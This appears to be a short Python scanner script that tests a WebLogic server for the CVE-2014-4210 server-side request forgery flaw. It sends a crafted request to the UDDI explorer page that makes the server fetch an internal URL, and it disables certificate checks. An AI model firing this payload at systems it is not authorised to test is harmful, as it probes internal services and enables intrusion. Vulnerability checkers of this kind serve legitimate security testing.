#!/usr/bin/env python
# coding: utf-8
# Date  : 2018-07-12 21:04:23
# Author: b4zinga
# Email : b4zinga@outlook.com
# Func  : weblogic ssrf

import requests

def run(url):
    """CVE-2014-4210"""
    payload = ":7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
    req = requests.get(url+payload, verify=False, timeout=10)
    if "weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and "IO Exception on sendMessage" not in req.text:
        return "WebLogic ssrf Vulnerable"
    else:
        return False